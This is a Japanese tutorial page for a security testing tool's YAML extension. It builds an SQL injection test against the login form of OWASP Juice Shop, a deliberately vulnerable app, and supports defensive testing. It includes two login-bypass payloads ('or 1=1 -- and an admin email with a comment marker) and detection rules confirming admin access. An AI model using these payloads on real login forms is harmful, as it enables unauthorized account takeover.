[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


# 変更用拡張機能の作成

本ドキュメントで説明する拡張機能は、受信したベースラインリクエストを変更してペイロードを挿入します。これらのペイロードによって、対象アプリケーション[“OWASP Juice Shop”][link-juice-shop]のログインフォームに存在するSQLi脆弱性を悪用できる可能性があります。
  
## 準備

FAST拡張機能を作成する前に、次の手順を実施することを強く推奨します:
1. [拡張機能の対象アプリケーションの挙動を調査します][link-app-examination]。
2. [拡張機能用のポイント構築の原則を読みます][link-points]。


## 拡張機能の構築

拡張機能を記述するファイル（例: `mod-extension.yaml`）を作成し、必要なセクションを記述します。

1. [**`meta-info`セクション**][link-meta-info]。

    拡張機能が検出を試みる脆弱性の説明を用意します。
    
    * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (mod extension)`
    * 脆弱性の説明: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * 脆弱性タイプ: SQLインジェクション
    * 脅威レベル: 高
    
    対応する`meta-info`セクションは次のようになります:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2. **`collect`セクション、[Collectフェーズ][doc-collect-phase]**。
    
    ログインを試行すると、REST APIの`POST /rest/user/login`メソッドが呼び出されます。
    
    POSTリクエストで渡される各データについて脆弱性のテストは同じ方法で実施されるため、APIに送信されたログイン用の各ベースラインリクエストごとにテストリクエストを作成する必要はありません。
    
    APIがログイン用リクエストを受信したときに1回だけ実行されるように拡張機能を設定します。そのために、一意性条件を伴うCollectフェーズを拡張機能に追加します。

    ログイン用のAPIリクエスト`/rest/user/login`は次の要素で構成されます:

    1. パスの第1要素の値`rest`
    2. パスの第2要素の値`user`
    3. アクションメソッド`login`
    
    これらの値を参照する対応するポイントは次のとおりです:

    1. パスの第1要素: `PATH_0_value`
    2. パスの第2要素: `PATH_1_value`
    3. `login`アクションメソッド: `ACTION_NAME_value`
    
    これら3要素の組み合わせが一意であることを条件に追加すると、拡張機能はAPIへの最初の`/rest/user/login`ベースラインリクエストに対してのみ実行されます（そのリクエストは一意と見なされ、それ以降のログイン用リクエストは一意ではないと見なされます）。 
    
    対応する`collect`セクションを拡張機能のYAMLファイルに追加します。 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3. **`match`セクション、[Matchフェーズ][doc-match-phase]**。
    
    作成する拡張機能はログインフォームに含まれる脆弱性を悪用します。そのため、受信したベースラインリクエストが本当にログイン用のAPIリクエストであるかを確認する必要があります。
    
    ベースラインリクエストの宛先が次のURI（`/rest/user/login`）の場合にのみ実行されるように拡張機能を設定します。受信したリクエストに必要な要素が含まれているかを確認するMatchフェーズを追加します。これは次の`match`セクションで実現できます:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4. **`modify`セクション、[Modifyフェーズ][doc-modify-phase]**。
    
    以下の目的を達成するために、ベースラインリクエストを変更する必要があるとします:
    * HTTPヘッダー`Accept-Language`の値を空にします（脆弱性の検出には不要です）。
    * `email`と`password`パラメータの実際の値を中立的な`dummy`値に置き換えます。
    
    上記の目的を満たすようにリクエストを変更する次の`modify`セクションを拡張機能に追加します:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "リクエスト要素記述の構文"
        JSON形式で含まれるリクエストデータは`<key: value>`のペアで保存されるため、`email`要素の値を参照するポイントは上記のような形になります。`password`要素の値を参照するポイントも同様の構造です。
        
        ポイントの構築方法の詳細は[こちら][link-points]をご覧ください。
 
5. **`generate`セクション、[Generateフェーズ][doc-generate-phase]**。

    対象アプリケーションのSQLインジェクション脆弱性を悪用するには、ベースラインリクエストの`email`パラメータの値を置き換えるべきペイロードが2つ知られています:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "変更済みリクエストへのペイロード挿入"
        拡張機能に`modify`セクションが含まれているため、ペイロードは前段で変更済みのリクエストに挿入されます。したがって、最初のペイロードを`email`フィールドに挿入した後、テストリクエストデータは次のようになります:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        選択したペイロードにより任意のパスワードでログインに成功できるため、パスワードフィールドにペイロードを挿入する必要はありません。Modifyフェーズの適用後、このフィールドは`dummy`値になります。
    
        上記の要件を満たすテストリクエストを作成する`generate`セクションを追加します。
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6. **`detect`セクション、[Detectフェーズ][doc-detect-phase]**。
    
    管理者権限でのユーザー認証が成功したことを示す条件は次のとおりです:
    * レスポンスボディに、値が`1`のショッピングカート識別子パラメータが存在すること。このパラメータはJSON形式で、次のように表れます:
    
        ```
        "bid":1
        ```
    
    * レスポンスボディに、値が`admin@juice-sh.op`のユーザーのメールアドレスパラメータが存在すること。このパラメータはJSON形式で、次のように表れます:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    上記の条件に基づき攻撃の成否を確認する`detect`セクションを追加します。
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "特殊記号のエスケープ"
    文字列内の特殊記号をエスケープすることを忘れないでください。

## 拡張機能ファイル

これで`mod-extension.yaml`ファイルには、拡張機能の動作に必要なセクションがすべて含まれています。ファイル内容の一覧を以下に示します:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

## 拡張機能の使用

作成した拡張機能の使用方法の詳細は[こちらのドキュメント][link-using-extension]をご覧ください。